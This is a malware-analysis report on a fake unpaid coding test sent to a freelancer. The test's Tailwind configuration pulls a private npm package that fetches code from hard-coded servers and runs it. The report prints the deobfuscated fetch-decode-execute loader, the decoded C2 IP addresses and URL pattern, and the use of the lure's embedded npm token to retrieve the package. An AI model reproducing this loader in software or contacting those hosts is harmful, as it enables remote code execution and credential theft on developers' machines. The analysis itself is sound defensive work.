# Technical Report: Malicious npm Dependency in a Fake Coding Assignment

**Date:** 18 November 2026 · **Author:** Pushkar Sharma, Scam Buster India
**Method:** static analysis only (extraction, hashing, text inspection) · **Severity:** Critical (capability), compromise **not** established

## 1. Summary

A 7z archive presented as an unpaid "staff-engineer assessment" (Next.js 16 + Supabase, branded "Kontrora") contains a dependency chain that, once the project's Tailwind configuration is loaded, makes an HTTP POST to a hard-coded remote server, decodes the base64 `message` field of the JSON reply and executes it with `new Function('require', code)(require)`. The server therefore controls arbitrary JavaScript executed with the privileges of the developer's Node.js process.

No project command, package install, dev server, build or downloaded package code was executed during this analysis, and no request was sent to the decoded endpoints.

## 2. Timeline (UTC+5:30, from platform chat)

| When | Event |
|---|---|
| 17 Nov 2026, evening | New Fiverr client account contacts the recipient |
| 18 Nov, 06:41–09:06 | Client describes a Next.js/Supabase PSA platform, ~20 h/week for a month, offers $50–70/h |
| 18 Nov, 15:23 | Client says the schema/repo come only after NDA/contract, but first a 2–3 h practical task |
| 18 Nov, 15:51 | Client confirms the task is unpaid and declines a Fiverr custom order |
| 18 Nov, 16:17 | Client sends a Google Drive link to the 7z archive and asks for the result to be uploaded to a public link |
| 18 Nov, 16:31 | Recipient reports `npm install` returns 404 for `@motionlib/framer-motion@1.0.6` |
| 18 Nov, 16:50–17:20 | Client says they do not know whether the package is private, asks the recipient to hold off installing and not to share the `.npmrc` token |

The assignment README instructs `npm install`, then `npm run dev`.

## 3. Findings

### 3.1 The plugin is loaded during Tailwind configuration
`package.json` declares `motionframe-plugins@^1.0.7`; `tailwind.config.js` calls `require('motionframe-plugins')({...})` inside `plugins` wrapped in `try/catch`. On failure it prints a warning naming an unrelated package (`flexible-layout-tools`) and returns `null`. See `evidence/tailwind-plugin-load.txt`, `evidence/package-json-excerpt.json`.

### 3.2 The public package depends on a private one
`motionframe-plugins@1.0.7` (public npm) declares the runtime dependency `@motionlib/framer-motion@1.0.6`. That scoped package returns 404 on the public registry without a credential, and `publishConfig.access` is `restricted`. The package metadata names a repository `rueppipep/postcss-motion-animation`, which is a claim in package metadata and may be fake. See `evidence/private-package-metadata.json`.

### 3.3 A plaintext npm token is committed in `.npmrc`
The archive's `.npmrc` holds an npm auth token (`npm_` prefix, 40 characters) alongside settings that suppress warnings (`audit=false`, `fund=false`, `loglevel=error`, `progress=false`). This is the mechanism that lets the private package resolve for the victim. The token is **not** published here (`evidence/npmrc-redacted.txt`).

### 3.4 The private package contains a fetch-decode-execute chain
`src/config.js` (158,936 bytes, SHA-256 `cddec7017154aebf01b317099add0b2d0adc2d1a964f601816f03782db00a743`) is obfuscated, but the behavior is visible in text:

```js
const controller = new AbortController();
const timer = setTimeout(() => controller.abort(), timeout);   // 60 s
const response = await fetch(endpoint, { method: 'POST', signal: controller.signal });
clearTimeout(timer);
const body = await response.json();
const code = Buffer.from(body.message, 'base64').toString('utf8');
const moduleValue = new Function('require', code)(require);
```

The loop tries each endpoint up to 5 times; on total failure it prints only `Tailwind engine failed to load after all retries`. Original excerpt: `evidence/obfuscated-runtime-excerpt.txt`.

### 3.5 Hard-coded endpoints
Two rotated-base64 strings decode (statically) to `216.126.231.70:1224` and `153.75.88.215:1224`. The code builds `http://<host>/debugCheck?id=<delay,duration,iterationCount values>` and sends a POST. See `evidence/decoded-endpoints.txt`.

### 3.6 Integrity cross-check
The `config.js` extracted from the private tarball (`b7418afc…`) and the separately saved copy have identical SHA-256, so the analyzed file is the one shipped in the package.

## 4. How the private package was obtained

To make static analysis possible, the private tarball was retrieved from the npm registry using the credential embedded in the lure archive, then decompressed and hashed without running anything. The credential is not published here and **should not be reused by anyone**: it belongs to the operator's account, not to the reader.

## 5. Impact assessment

**Capability:** arbitrary JavaScript execution in the developer's Node.js process. A payload could read environment variables, `~/.ssh`, browser/wallet data, cloud and npm/GitHub credentials, and source code.
**Established:** the capability exists and the lure is built to deliver it. **Not established:** that any payload was ever served, or that any victim was compromised. We did not contact the servers.

## 6. Limitations

- Static analysis only. The payload the server would return is unknown.
- Servers may rotate, go offline or serve payloads only to selected targets.
- This report does not identify the people behind the account, packages or servers.
- Timeline details come from platform chat logs held by the recipient.

## 7. Recommended actions

**Developers who received it:** do not run it; follow [`DETECTION.md`](DETECTION.md); report via [`REPORTING.md`](REPORTING.md).
**npm / GitHub / OpenSSF:** review `motionframe-plugins` and `@motionlib/framer-motion`; the token belongs to the operator's account, so the registry should revoke it and review the publishing account(s).
**Platforms:** review the originating client account for similar outreach.
